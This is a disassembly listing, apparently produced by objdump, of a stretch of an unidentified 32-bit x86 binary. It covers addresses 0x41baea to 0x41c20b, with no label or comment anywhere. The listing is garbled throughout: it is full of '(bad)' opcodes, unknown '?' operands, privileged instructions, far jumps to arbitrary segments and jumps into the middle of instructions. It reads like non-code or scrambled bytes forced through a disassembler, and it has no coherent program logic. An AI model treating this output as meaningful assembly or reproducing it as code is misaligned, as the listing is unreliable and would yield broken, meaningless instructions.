  41baea:	(bad)  
  41baeb:	xor    DWORD PTR [eax-0x6b],esi
  41baee:	push   ds
  41baef:	dec    ebp
  41baf0:	lods   eax,DWORD PTR ds:[esi]
  41baf1:	push   0x49
  41baf3:	add    ah,ch
  41baf5:	pop    esp
  41baf6:	repz push ds
  41baf8:	popf   
  41baf9:	mov    cl,0x9f
  41bafb:	ret    0xf58d
  41bafe:	loopne 0x41bae2
  41bb00:	push   ss
  41bb01:	inc    edx
  41bb02:	mov    ds:0xb917134d,al
  41bb07:	or     edi,DWORD PTR [esi]
  41bb09:	mov    eax,0x420715ba
  41bb0e:	cmp    al,0xfb
  41bb10:	je     0x41bb24
  41bb12:	xacquire xchg BYTE PTR [eax-0x34c6cb24],ah
  41bb19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb1a:	repz mov edi,0x843fa75b
  41bb20:	pop    ecx
  41bb21:	xchg   ebx,eax
  41bb22:	mov    esi,0x3db038dd
  41bb27:	push   cs
  41bb28:	gs mov bl,0x5
  41bb2b:	test   eax,0x1c135959
  41bb30:	cmc    
  41bb31:	aam    0x22
  41bb33:	lock ret 
  41bb35:	nop
  41bb36:	dec    ecx
  41bb37:	fimul  WORD PTR [esi]
  41bb39:	jo     0x41bb35
  41bb3b:	es push 0xc8e92aa8
  41bb41:	(bad)  
  41bb42:	stc    
  41bb43:	or     al,0xd0
  41bb45:	cmc    
  41bb46:	iret   
  41bb47:	mov    dl,0xb6
  41bb49:	xor    BYTE PTR [esi-0x5d],ch
  41bb4c:	(bad)  
  41bb4e:	out    dx,eax
  41bb4f:	xor    ch,ah
  41bb51:	jecxz  0x41bb01
  41bb53:	ret    0x8888
  41bb56:	out    dx,eax
  41bb57:	(bad)  
  41bb58:	popf   
  41bb59:	mov    dl,0xcc
  41bb5b:	ins    DWORD PTR es:[edi],dx
  41bb5c:	inc    esp
  41bb5d:	xchg   edx,eax
  41bb5e:	fst    QWORD PTR [eax]
  41bb60:	sbb    DWORD PTR [edi],edx
  41bb62:	pop    esi
  41bb63:	std    
  41bb64:	push   esi
  41bb65:	icebp  
  41bb66:	rcr    BYTE PTR [ebp+0xec751d9],cl
  41bb6c:	lea    esi,[edi+0x6be2f698]
  41bb72:	sbb    DWORD PTR [eax+0x6a],ebx
  41bb75:	imul   ecx,eax,0xc7a38f67
  41bb7b:	or     BYTE PTR [ecx],cl
  41bb7d:	retf   0x141
  41bb80:	icebp  
  41bb81:	adc    ecx,DWORD PTR [esi+0x2199e8f2]
  41bb87:	xchg   ebp,eax
  41bb88:	pusha  
  41bb89:	cs mov bl,0x57
  41bb8c:	dec    ecx
  41bb8d:	jns    0x41bba5
  41bb8f:	inc    eax
  41bb90:	cmp    al,BYTE PTR [edx-0x3935081c]
  41bb96:	mov    eax,0x4c7331bc
  41bb9b:	pop    ebx
  41bb9c:	rcr    BYTE PTR [ebx+0x1bad6ddb],0xab
  41bba3:	inc    ebp
  41bba4:	icebp  
  41bba5:	dec    ebx
  41bba6:	mov    eax,DWORD PTR [eax+0x1352a97a]
  41bbac:	dec    eax
  41bbad:	inc    edi
  41bbae:	sub    ebx,DWORD PTR [edi+edx*8]
  41bbb1:	gs test eax,0x4ec1628f
  41bbb7:	add    BYTE PTR [esi],al
  41bbb9:	mov    DWORD PTR [ebp-0x75],edx
  41bbbc:	pop    edx
  41bbbd:	call   0x51a9:0x7fe66055
  41bbc4:	lods   eax,DWORD PTR ds:[esi]
  41bbc5:	xor    DWORD PTR [eax],esi
  41bbc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bbc8:	and    DWORD PTR [ecx-0x53cad233],ebp
  41bbce:	int3   
  41bbcf:	in     eax,0xba
  41bbd1:	push   esi
  41bbd2:	cs (bad) 
  41bbd4:	dec    edi
  41bbd5:	xchg   ecx,eax
  41bbd6:	das    
  41bbd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbd8:	inc    esi
  41bbd9:	mov    ds:0xefdf423c,eax
  41bbde:	jns    0x41bc1d
  41bbe0:	jge    0x41bbb6
  41bbe2:	inc    esi
  41bbe3:	test   ah,dh
  41bbe5:	adc    al,BYTE PTR [edx+0x183d2186]
  41bbeb:	xchg   ecx,eax
  41bbec:	fidiv  WORD PTR [edx]
  41bbee:	inc    BYTE PTR [esi]
  41bbf0:	xor    esp,DWORD PTR [ebx+0x670a2a25]
  41bbf6:	adc    DWORD PTR [ebx],edi
  41bbf8:	push   esp
  41bbf9:	and    bl,al
  41bbfb:	push   esi
  41bbfc:	enter  0xc5d4,0x17
  41bc00:	hlt    
  41bc01:	in     eax,dx
  41bc02:	retf   0xd82e
  41bc05:	(bad)  
  41bc06:	fisubr DWORD PTR [ebp+0x1c]
  41bc09:	jns    0x41bc76
  41bc0b:	jmp    0x55087953
  41bc10:	out    0xd2,eax
  41bc12:	je     0x41bc77
  41bc14:	and    cl,BYTE PTR [eax+0x3e]
  41bc17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc18:	adc    dh,cl
  41bc1a:	inc    edx
  41bc1b:	sub    cl,BYTE PTR [edx+0x0]
  41bc1e:	cs mov ecx,0xe621df0c
  41bc24:	imul   ebx,DWORD PTR [ebp-0x3],0xffffff8d
  41bc28:	shl    BYTE PTR [ebp+edx*8+0x79],0xe0
  41bc2d:	pop    edx
  41bc2e:	mov    edx,0x1c821c50
  41bc33:	sahf   
  41bc34:	push   ebp
  41bc35:	cmp    eax,0x1aad5c03
  41bc3a:	xchg   ebx,eax
  41bc3b:	nop
  41bc3c:	(bad)  
  41bc3d:	repnz dec edx
  41bc3f:	ds (bad) 
  41bc42:	jne    0x41bbdf
  41bc44:	test   eax,0x7936cfab
  41bc49:	or     cl,ch
  41bc4b:	cdq    
  41bc4c:	push   eax
  41bc4d:	scas   eax,DWORD PTR es:[edi]
  41bc4e:	jecxz  0x41bc25
  41bc50:	int3   
  41bc51:	mov    bl,0xf
  41bc53:	cmp    ecx,0xdab09454
  41bc59:	cdq    
  41bc5a:	sbb    bh,BYTE PTR [eax]
  41bc5c:	clc    
  41bc5d:	sti    
  41bc5e:	hlt    
  41bc5f:	aad    0x22
  41bc61:	div    ebp
  41bc63:	push   ebx
  41bc64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc65:	and    ch,dl
  41bc67:	mov    DWORD PTR [edi+ebp*1-0x44a0ad72],edx
  41bc6e:	sub    dh,BYTE PTR [edi]
  41bc70:	xchg   esi,eax
  41bc71:	mov    cl,0xe1
  41bc73:	jmp    0x41bc72
  41bc75:	popa   
  41bc76:	sbb    eax,0x1ad37765
  41bc7b:	scas   eax,DWORD PTR es:[edi]
  41bc7c:	lea    ebp,[ebx-0x74]
  41bc7f:	jmp    0x92b3:0xb5dbe62a
  41bc86:	inc    edx
  41bc87:	xor    BYTE PTR [ebx-0x4041e6ae],dh
  41bc8d:	mov    edx,0x777e399c
  41bc92:	or     esp,DWORD PTR [edi]
  41bc94:	hlt    
  41bc95:	je     0x41bc82
  41bc97:	popa   
  41bc98:	xchg   ebx,eax
  41bc99:	(bad)  
  41bc9b:	push   ebx
  41bc9c:	aaa    
  41bc9d:	ror    dh,0x3b
  41bca0:	jne    0x41bc73
  41bca2:	fiadd  WORD PTR [edx-0x38fa18c6]
  41bca8:	pop    edx
  41bca9:	adc    esi,DWORD PTR [ecx+0x31]
  41bcac:	call   0x4292c500
  41bcb1:	and    ecx,ebx
  41bcb3:	dec    ebx
  41bcb4:	push   ebp
  41bcb5:	imul   ebp,DWORD PTR [ebp+0x6a],0xffffff8c
  41bcb9:	push   esi
  41bcba:	aas    
  41bcbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bcbc:	xlat   BYTE PTR ds:[ebx]
  41bcbd:	pop    ss
  41bcbe:	bound  ebx,QWORD PTR [edi]
  41bcc0:	(bad)  
  41bcc2:	iret   
  41bcc3:	enter  0x134b,0x8e
  41bcc7:	loope  0x41bd22
  41bcc9:	and    DWORD PTR [ebx-0x67d78156],edi
  41bccf:	test   eax,0x18b40b30
  41bcd4:	ret    0xf2bb
  41bcd7:	push   ss
  41bcd8:	lock pop ecx
  41bcda:	mov    edx,0x95cba4f2
  41bcdf:	adc    dl,BYTE PTR [edx]
  41bce1:	mov    al,BYTE PTR [esi]
  41bce3:	outs   dx,BYTE PTR ds:[esi]
  41bce4:	mov    edx,0xd05aabda
  41bce9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bcea:	mov    cl,0x7f
  41bcec:	push   edi
  41bced:	xchg   esi,eax
  41bcee:	ret    0x5c71
  41bcf1:	xchg   esp,eax
  41bcf2:	sub    dh,BYTE PTR [ebp+0x1760a9e1]
  41bcf8:	test   eax,0xbc85fe9c
  41bcfd:	cdq    
  41bcfe:	mov    bh,0xac
  41bd00:	fs sbb dl,bl
  41bd03:	jo     0x41bd42
  41bd05:	out    0x2c,eax
  41bd07:	icebp  
  41bd08:	(bad)  
  41bd09:	retf   0x1d8a
  41bd0c:	mov    eax,ds:0x275d2f5c
  41bd11:	or     ebx,0xffffffaf
  41bd14:	jne    0x41bd94
  41bd16:	jecxz  0x41bd7a
  41bd18:	cli    
  41bd19:	pop    ss
  41bd1a:	sub    DWORD PTR [ecx-0x64],edx
  41bd1d:	(bad)  
  41bd1e:	xchg   edi,eax
  41bd1f:	jg     0x41bd57
  41bd21:	push   es
  41bd22:	cli    
  41bd23:	add    eax,0xc0a1ab88
  41bd28:	xchg   ebp,eax
  41bd29:	lahf   
  41bd2a:	xor    dl,cl
  41bd2c:	mov    DWORD PTR [eax],esi
  41bd2e:	sbb    ecx,DWORD PTR [eax]
  41bd30:	dec    eax
  41bd31:	xor    BYTE PTR [edi],ah
  41bd33:	push   cs
  41bd34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd35:	cmp    dh,BYTE PTR [eax+0x40]
  41bd38:	sbb    DWORD PTR [edx-0x749a8361],0xffffffaf
  41bd3f:	jno    0x41bdba
  41bd41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd42:	mov    ds:0x268b8a9,al
  41bd47:	jne    0x41bd04
  41bd49:	inc    bp
  41bd4b:	in     al,0xa
  41bd4d:	aad    0x43
  41bd4f:	xor    BYTE PTR ds:0x1fc536e9,cl
  41bd55:	ins    BYTE PTR es:[edi],dx
  41bd56:	lock sti 
  41bd58:	jg     0x41bd5d
  41bd5a:	push   esi
  41bd5b:	popf   
  41bd5c:	(bad)  
  41bd5e:	adc    dh,BYTE PTR [ebp+ebx*8+0x23d51df1]
  41bd65:	jae    0x41bd8c
  41bd67:	push   edx
  41bd68:	jecxz  0x41bd32
  41bd6a:	daa    
  41bd6b:	dec    ecx
  41bd6c:	ja     0x41bd5f
  41bd6e:	pop    ecx
  41bd6f:	adc    eax,esi
  41bd71:	mov    al,0x9e
  41bd73:	adc    esp,DWORD PTR [ecx+0x3e]
  41bd76:	mov    bl,0x6e
  41bd78:	jmp    0x41bdbc
  41bd7a:	pusha  
  41bd7b:	cmp    DWORD PTR [ebx],0x5a
  41bd7e:	js     0x41bd66
  41bd80:	bound  eax,QWORD PTR [ebx+0x31]
  41bd83:	inc    ebp
  41bd84:	jecxz  0x41bd4c
  41bd86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd87:	test   dh,ah
  41bd89:	outs   dx,DWORD PTR fs:[esi]
  41bd8b:	lods   eax,DWORD PTR ds:[esi]
  41bd8c:	pop    esp
  41bd8d:	or     dh,BYTE PTR [edi]
  41bd8f:	pop    ss
  41bd90:	sbb    DWORD PTR [edi+eax*1+0x63],edx
  41bd94:	pusha  
  41bd95:	stos   DWORD PTR es:[edi],eax
  41bd96:	icebp  
  41bd97:	cmp    eax,0x6eb5c6bf
  41bd9c:	aaa    
  41bd9d:	mov    WORD PTR [edi+0x45fbbed5],fs
  41bda3:	out    0xd9,al
  41bda5:	in     al,0x7b
  41bda7:	cmp    eax,0xc2e47ee5
  41bdac:	xlat   BYTE PTR ds:[ebx]
  41bdad:	jecxz  0x41bdd7
  41bdaf:	and    al,0xf5
  41bdb1:	int    0x4b
  41bdb3:	adc    DWORD PTR [esi+0x61],ebp
  41bdb6:	jns    0x41bd54
  41bdb8:	adc    dh,dl
  41bdba:	push   ds
  41bdbb:	pop    eax
  41bdbc:	add    DWORD PTR [edx+ecx*2+0x6b],edx
  41bdc0:	loope  0x41bdb5
  41bdc2:	add    al,BYTE PTR ds:0xee5b4e67
  41bdc8:	fild   QWORD PTR [edx]
  41bdca:	fidiv  WORD PTR [ebp+0x76de55a0]
  41bdd0:	xlat   BYTE PTR ds:[ebx]
  41bdd1:	mov    esp,0xd32b39d6
  41bdd6:	dec    esp
  41bdd7:	mov    esp,0x2959221b
  41bddc:	cmp    BYTE PTR [ebx+0x3f8d98d4],bl
  41bde2:	test   al,0x84
  41bde4:	pop    ebx
  41bde5:	pop    eax
  41bde6:	das    
  41bde7:	pop    ss
  41bde8:	jno    0x41be18
  41bdea:	xchg   DWORD PTR [edi+0x117e7666],ecx
  41bdf0:	ja     0x41bd82
  41bdf2:	dec    esp
  41bdf3:	xchg   edx,eax
  41bdf4:	and    esi,ecx
  41bdf6:	fidivr DWORD PTR [edx+eax*4-0x17]
  41bdfa:	mov    edi,0x3af24251
  41bdff:	sub    al,0x49
  41be01:	lea    eax,[ebx+0x5b]
  41be04:	fstp   DWORD PTR [eax+0x123fd2cc]
  41be0a:	xor    al,0x40
  41be0c:	inc    eax
  41be0d:	(bad)  
  41be0f:	sbb    DWORD PTR ds:0xef23be2d,edx
  41be15:	cmc    
  41be16:	and    DWORD PTR [eax-0x63],ecx
  41be19:	mov    dh,0x12
  41be1b:	in     eax,0x7b
  41be1d:	adc    eax,0x354a097
  41be22:	lahf   
  41be23:	sbb    DWORD PTR [edx-0x18],edx
  41be26:	jge    0x41bddf
  41be28:	outs   dx,DWORD PTR ds:[esi]
  41be29:	nop
  41be2a:	push   ecx
  41be2b:	sbb    esp,esi
  41be2d:	xor    DWORD PTR [edi+eax*8+0x72],esi
  41be31:	shr    DWORD PTR [eax+eax*4+0x31d5f726],1
  41be38:	cdq    
  41be39:	xor    ebp,DWORD PTR [esi-0x23a03575]
  41be3f:	adc    al,0xda
  41be41:	lods   al,BYTE PTR ds:[esi]
  41be42:	shl    DWORD PTR [ebx],cl
  41be44:	mov    es,WORD PTR [esi-0x2089076]
  41be4a:	push   esi
  41be4b:	dec    esi
  41be4c:	lods   al,BYTE PTR ds:[esi]
  41be4d:	fsub   DWORD PTR [ecx-0x7a]
  41be50:	(bad)  
  41be51:	hlt    
  41be52:	fcom   DWORD PTR [ecx]
  41be54:	scas   al,BYTE PTR es:[edi]
  41be55:	mov    ?,esi
  41be57:	ficomp WORD PTR [edx-0x4]
  41be5a:	fsubr  QWORD PTR ss:[esi-0x64]
  41be5e:	sbb    DWORD PTR [eax-0x435d547e],esp
  41be64:	xor    esi,ebx
  41be66:	call   0x6e78:0x5a43f21b
  41be6d:	fnsave [edi+eax*2-0x72]
  41be71:	jo     0x41be36
  41be73:	out    0xd6,al
  41be75:	xchg   ebx,eax
  41be76:	mov    dh,ah
  41be78:	ret    0xe7f4
  41be7b:	aaa    
  41be7c:	add    ebp,DWORD PTR [ecx-0x4c7f32c]
  41be82:	ret    0x301e
  41be85:	rol    DWORD PTR [ecx-0x14efb32d],0x51
  41be8c:	dec    eax
  41be8d:	fild   DWORD PTR [ebp+0x6e95369e]
  41be93:	add    BYTE PTR [esi+0x502c9d8e],ch
  41be99:	or     dh,BYTE PTR ds:0x9fc0e7c7
  41be9f:	cwde   
  41bea0:	or     eax,0xb099e747
  41bea5:	lahf   
  41bea6:	pop    ecx
  41bea7:	stos   BYTE PTR es:[edi],al
  41bea8:	pop    ebp
  41bea9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41beaa:	imul   esi,DWORD PTR [edx+0x55],0xffffffbb
  41beae:	js     0x41be32
  41beb0:	or     al,0x6a
  41beb2:	lock js 0x41be4e
  41beb5:	mov    edi,0x851b7414
  41beba:	sbb    eax,0xaf53f01a
  41bebf:	popa   
  41bec0:	ret    0x9d01
  41bec3:	pushf  
  41bec4:	retf   
  41bec5:	aaa    
  41bec6:	push   0x4b
  41bec8:	jns    0x41bea0
  41beca:	jno    0x41bf0e
  41becc:	hlt    
  41becd:	leave  
  41bece:	sub    ah,BYTE PTR [ecx]
  41bed0:	mov    BYTE PTR [edi],dh
  41bed2:	mov    bh,0x6f
  41bed4:	arpl   WORD PTR [ebx+0x62],bp
  41bed7:	adc    al,0x4f
  41bed9:	jb     0x41bf2c
  41bedb:	cld    
  41bedc:	sbb    eax,0xa2bf3b1
  41bee1:	jecxz  0x41beeb
  41bee3:	mov    eax,0x461aaeac
  41bee8:	inc    esp
  41bee9:	sbb    DWORD PTR [ebp-0x2e343e0e],edx
  41beef:	pop    ebp
  41bef0:	mov    al,ds:0x4008d9ec
  41bef5:	add    DWORD PTR [ebp+0x4d],ebx
  41bef8:	push   cs
  41bef9:	push   ebx
  41befa:	fwait
  41befb:	test   DWORD PTR [ebp+0x60],ebp
  41befe:	psubsw mm7,QWORD PTR [ecx]
  41bf01:	or     edi,eax
  41bf03:	imul   ebp,DWORD PTR [edi-0x19826613],0xffffffbb
  41bf0a:	test   BYTE PTR [ecx-0x78],0x5
  41bf0e:	(bad)  
  41bf0f:	and    DWORD PTR [edi-0x50],edi
  41bf12:	push   ebp
  41bf13:	std    
  41bf14:	dec    edx
  41bf15:	(bad)  
  41bf16:	loopne 0x41bf12
  41bf18:	sub    bh,BYTE PTR [eax+0xb]
  41bf1b:	inc    ebx
  41bf1c:	daa    
  41bf1d:	sbb    bl,BYTE PTR [esi+0xa]
  41bf20:	rcr    DWORD PTR [ecx+0x59ba77df],0xc7
  41bf27:	sbb    bl,dl
  41bf29:	(bad)  
  41bf2a:	pop    ecx
  41bf2b:	outs   dx,BYTE PTR ds:[esi]
  41bf2c:	mov    gs,WORD PTR [eax-0x22]
  41bf2f:	arpl   cx,cx
  41bf31:	adc    eax,edi
  41bf33:	or     DWORD PTR [edi+0x6e],ebx
  41bf36:	mov    WORD PTR [eax-0x334b0631],?
  41bf3c:	rcr    ah,cl
  41bf3e:	cmp    ch,al
  41bf40:	test   eax,0xa00ca5aa
  41bf45:	adc    DWORD PTR [ecx-0x38],esp
  41bf48:	(bad)  
  41bf49:	sbb    al,0xbb
  41bf4b:	and    ecx,DWORD PTR [ecx+0x38cfd35b]
  41bf51:	aaa    
  41bf52:	and    edx,edi
  41bf54:	jne    0x41bf56
  41bf56:	not    DWORD PTR [esi]
  41bf58:	mov    ch,0xf4
  41bf5a:	clc    
  41bf5b:	inc    ebx
  41bf5c:	adc    DWORD PTR [ebp+0x1fa90850],ebp
  41bf62:	mov    ds:0xd40e1a3,eax
  41bf67:	xchg   esp,eax
  41bf68:	out    0xb9,al
  41bf6a:	pop    ebx
  41bf6b:	data16 outs dx,BYTE PTR ds:[esi]
  41bf6d:	mov    bh,BYTE PTR [esi+0x15639465]
  41bf73:	fsubr  st,st(3)
  41bf75:	popa   
  41bf76:	fucompp 
  41bf78:	hlt    
  41bf79:	mov    edx,0xa435dc
  41bf7e:	inc    edx
  41bf7f:	dec    ebp
  41bf80:	lods   eax,DWORD PTR ds:[esi]
  41bf81:	jno    0x41bf9d
  41bf83:	push   ecx
  41bf84:	and    eax,0x86fbb023
  41bf89:	ins    BYTE PTR es:[edi],dx
  41bf8a:	les    esi,FWORD PTR [esi+0x56bc9617]
  41bf90:	mov    bh,0xf8
  41bf92:	idiv   DWORD PTR [esi]
  41bf94:	add    DWORD PTR [edx],ebp
  41bf96:	or     eax,0x4a089192
  41bf9b:	inc    edx
  41bf9c:	lods   eax,DWORD PTR ds:[esi]
  41bf9d:	add    esi,DWORD PTR ds:0x9fa15a75
  41bfa3:	and    al,0xa1
  41bfa5:	fabs   
  41bfa7:	std    
  41bfa8:	pop    ecx
  41bfa9:	call   0xd19a22d1
  41bfae:	push   es
  41bfaf:	push   eax
  41bfb0:	push   edx
  41bfb1:	xchg   ecx,eax
  41bfb2:	mov    es,WORD PTR [ecx]
  41bfb4:	mov    bh,0xb1
  41bfb6:	fdiv   QWORD PTR [eax-0x3321fac8]
  41bfbc:	sbb    al,0x3d
  41bfbe:	push   ss
  41bfbf:	xor    DWORD PTR [esi+0x7e],ebx
  41bfc2:	xchg   edx,eax
  41bfc4:	imul   eax,DWORD PTR [ebx-0x58],0xfef9bee4
  41bfcb:	hlt    
  41bfcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bfcd:	sti    
  41bfce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bfcf:	pop    ebp
  41bfd0:	push   eax
  41bfd1:	mov    WORD PTR [ecx+0xa39d3d],fs
  41bfd7:	lds    esi,FWORD PTR [edi+0x39]
  41bfda:	lods   al,BYTE PTR ds:[esi]
  41bfdb:	cwde   
  41bfdc:	xchg   ebp,eax
  41bfdd:	(bad)  
  41bfde:	mov    esp,0xb0eb2d8f
  41bfe3:	test   BYTE PTR [ebp-0x68],al
  41bfe6:	ins    DWORD PTR es:[edi],dx
  41bfe7:	adc    al,0x7d
  41bfe9:	push   ebp
  41bfea:	pusha  
  41bfeb:	fsub   DWORD PTR [eax]
  41bfed:	mov    ecx,0xd0ad2056
  41bff2:	dec    esp
  41bff3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bff4:	add    BYTE PTR [ebx+0x6],bh
  41bff7:	push   ds
  41bff8:	cs ins DWORD PTR es:[edi],dx
  41bffa:	(bad)  [ebx-0x54]
  41bffd:	mov    DWORD PTR [edx+0x4cfa5e],eax
  41c003:	das    
  41c004:	mov    edx,0x6f23b29e
  41c009:	push   esi
  41c00a:	mov    dh,0xa7
  41c00c:	fdivr  QWORD PTR [edx-0x60acbb10]
  41c012:	iret   
  41c013:	sub    al,0xc2
  41c016:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c017:	ret    0xe095
  41c01a:	test   eax,0xbaa735fb
  41c01f:	fstp   st(5)
  41c021:	loope  0x41bfbb
  41c023:	push   0xd719a677
  41c028:	and    eax,0x5cd233a2
  41c02d:	icebp  
  41c02e:	xchg   edi,eax
  41c02f:	adc    ecx,DWORD PTR [ebp+0x547ed005]
  41c035:	mov    edi,0x1d903932
  41c03a:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c03c:	mov    eax,0x25e07eb8
  41c041:	in     eax,0xea
  41c043:	lahf   
  41c044:	stos   BYTE PTR es:[edi],al
  41c045:	lock mov DWORD PTR [ebx+0x32212b7c],edx
  41c04c:	in     al,0x44
  41c04e:	in     al,0xf5
  41c050:	mov    dh,0x2f
  41c052:	sti    
  41c053:	test   al,0x55
  41c055:	inc    esp
  41c056:	mov    ecx,0xf57c9af7
  41c05b:	push   0x26
  41c05d:	add    eax,0x50f51844
  41c062:	call   0xd689:0x96c093e2
  41c069:	push   es
  41c06a:	in     eax,dx
  41c06b:	xor    bh,cl
  41c06d:	sahf   
  41c06e:	push   0x1f
  41c070:	scas   eax,DWORD PTR es:[edi]
  41c071:	and    bl,ah
  41c073:	dec    esi
  41c074:	fs hlt 
  41c076:	into   
  41c077:	and    esp,0x406af3f7
  41c07d:	inc    edi
  41c07e:	or     ch,dh
  41c080:	mov    WORD PTR [esp+edx*2],?
  41c083:	jge    0x41c0ee
  41c085:	mov    cl,0x3
  41c087:	stc    
  41c088:	fld    TBYTE PTR [ebx+0x7e]
  41c08b:	or     DWORD PTR [esi*4-0x50b9a8d4],0xffffffc5
  41c093:	adc    al,0x72
  41c095:	shr    BYTE PTR [edx],0x4e
  41c098:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c099:	test   esp,ebx
  41c09b:	mov    ds:0x50a3aa7b,eax
  41c0a0:	sar    BYTE PTR [esi+0x6e],1
  41c0a3:	push   edi
  41c0a4:	imul   eax,ebx,0x99ee65f1
  41c0aa:	sub    esp,edi
  41c0ac:	fimul  WORD PTR [ebx-0x54]
  41c0af:	sub    bl,BYTE PTR [ebx]
  41c0b1:	adc    BYTE PTR [ebx],ch
  41c0b3:	mov    eax,ds:0x8a216372
  41c0b8:	push   esi
  41c0b9:	jns    0x41c07f
  41c0bb:	shl    al,0x44
  41c0be:	les    esi,FWORD PTR [edx+ebx*8+0x28]
  41c0c2:	dec    eax
  41c0c3:	neg    DWORD PTR [esi]
  41c0c5:	rcr    cl,0x35
  41c0c8:	xlat   BYTE PTR ds:[ebx]
  41c0c9:	sar    BYTE PTR [ecx-0x20cd9cb6],0xc5
  41c0d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0d1:	dec    ebx
  41c0d2:	or     eax,0x23220f16
  41c0d7:	push   ebx
  41c0d8:	xor    ch,dl
  41c0da:	add    edx,DWORD PTR [ebp-0x2fcaf1b1]
  41c0e0:	mov    edi,DWORD PTR [esi*4+0x50a0f878]
  41c0e7:	dec    edi
  41c0e8:	ret    
  41c0e9:	stos   BYTE PTR es:[edi],al
  41c0ea:	xchg   ecx,eax
  41c0eb:	mov    edx,0xfc3c8036
  41c0f0:	sbb    al,0xd2
  41c0f2:	mov    edi,0xa9e46407
  41c0f7:	bound  ebp,QWORD PTR [ecx+0x12aaf5d5]
  41c0fd:	jmp    0x95ccee0c
  41c102:	dec    esi
  41c103:	inc    ebp
  41c104:	loope  0x41c09d
  41c106:	add    DWORD PTR [esi-0x5b4f90be],edx
  41c10c:	lahf   
  41c10d:	sar    BYTE PTR [edx+0x53a76984],cl
  41c113:	adc    DWORD PTR [ecx+0x2f],edx
  41c116:	ja     0x41c0fc
  41c118:	das    
  41c119:	adc    al,0x5d
  41c11b:	sbb    ch,BYTE PTR [ecx-0x25]
  41c11e:	push   ebp
  41c11f:	xor    BYTE PTR [edi-0x73f9e277],0x98
  41c126:	scas   al,BYTE PTR es:[edi]
  41c127:	int    0xbd
  41c129:	repz mov dh,0x4f
  41c12c:	or     eax,0x3c5d0859
  41c131:	sub    edx,edi
  41c133:	repnz and DWORD PTR [edi+0x34e4de22],ecx
  41c13a:	sub    ch,0x50
  41c13d:	xchg   edi,eax
  41c13e:	mov    bh,0xb5
  41c140:	fwait
  41c141:	sbb    ch,BYTE PTR [eax+0x58]
  41c144:	push   ss
  41c145:	mov    esp,0x68bb3197
  41c14a:	add    al,BYTE PTR [ebp-0x35]
  41c14d:	pop    esi
  41c14e:	mov    DWORD PTR ds:0xdc951ce6,esp
  41c154:	jbe    0x41c164
  41c156:	mov    cl,0xde
  41c158:	push   esi
  41c159:	stos   DWORD PTR es:[edi],eax
  41c15a:	sub    ebp,ecx
  41c15c:	test   BYTE PTR [edx+0x15],ch
  41c15f:	dec    edx
  41c160:	and    dh,BYTE PTR [edx]
  41c162:	int    0xc0
  41c164:	out    0x2f,eax
  41c166:	fwait
  41c167:	cld    
  41c168:	mov    ?,ebx
  41c16a:	(bad)  
  41c16b:	xlat   BYTE PTR ds:[ebx]
  41c16c:	test   DWORD PTR [ecx+0x75],ebx
  41c16f:	pop    es
  41c170:	add    DWORD PTR [edi+0x1e],0xffffffb2
  41c174:	das    
  41c175:	pop    eax
  41c176:	sbb    eax,DWORD PTR [edx+0x499843b1]
  41c17c:	sti    
  41c17d:	je     0x41c12b
  41c17f:	fwait
  41c180:	iret   
  41c181:	cld    
  41c182:	jg     0x41c149
  41c184:	stos   DWORD PTR es:[edi],eax
  41c185:	int    0x64
  41c187:	nop
  41c188:	in     al,0xa4
  41c18a:	or     BYTE PTR [esi],dh
  41c18c:	in     eax,dx
  41c18d:	sar    DWORD PTR [ebx+0x5e],0xe9
  41c191:	mov    esi,0xf4f4553c
  41c196:	adc    edi,DWORD PTR [eax]
  41c198:	loopne 0x41c1ea
  41c19a:	sub    eax,0xffffff9f
  41c19d:	adc    al,0xce
  41c19f:	(bad)  
  41c1a0:	push   esi
  41c1a1:	mov    ebx,0x27a74401
  41c1a6:	pop    ebx
  41c1a7:	lock mov ch,0x89
  41c1aa:	shl    DWORD PTR [eax],0x9c
  41c1ad:	rol    BYTE PTR [esi-0x49],0x4c
  41c1b1:	adc    al,0x42
  41c1b3:	dec    edx
  41c1b4:	pop    edi
  41c1b5:	push   0x42
  41c1b7:	test   edi,esi
  41c1b9:	jb     0x41c141
  41c1bb:	retf   
  41c1bc:	ss sub al,cl
  41c1bf:	nop
  41c1c0:	mov    ecx,edi
  41c1c2:	mov    dh,0xd
  41c1c4:	pop    eax
  41c1c5:	lds    ebx,FWORD PTR [ebx+0x3845a6f9]
  41c1cb:	outs   dx,DWORD PTR ds:[esi]
  41c1cc:	mov    al,ds:0x6576f728
  41c1d1:	in     al,dx
  41c1d2:	xchg   ecx,eax
  41c1d3:	(bad)  
  41c1d4:	mov    ebp,0x34a22e4e
  41c1d9:	test   BYTE PTR [edi+eax*8],0x4
  41c1dd:	sbb    ah,ch
  41c1df:	cs retf 0x9b3b
  41c1e3:	ret    
  41c1e4:	mov    fs,ebx
  41c1e6:	mov    ds:0x9cfe7e75,eax
  41c1eb:	cdq    
  41c1ec:	pop    ebx
  41c1ed:	xor    eax,0x30d8f4db
  41c1f2:	mov    bl,0xc4
  41c1f4:	push   ds
  41c1f5:	cwde   
  41c1f6:	fwait
  41c1f7:	jo     0x41c17d
  41c1f9:	mov    ch,0xe5
  41c1fb:	ficomp DWORD PTR [bx]
  41c1fe:	pop    es
  41c1ff:	inc    edi
  41c200:	int3   
  41c201:	xor    ah,BYTE PTR [eax+0x2012d2d2]
  41c207:	cmp    esi,0x30
  41c20a:	sahf   
  41c20b:	xchg   esp,eax
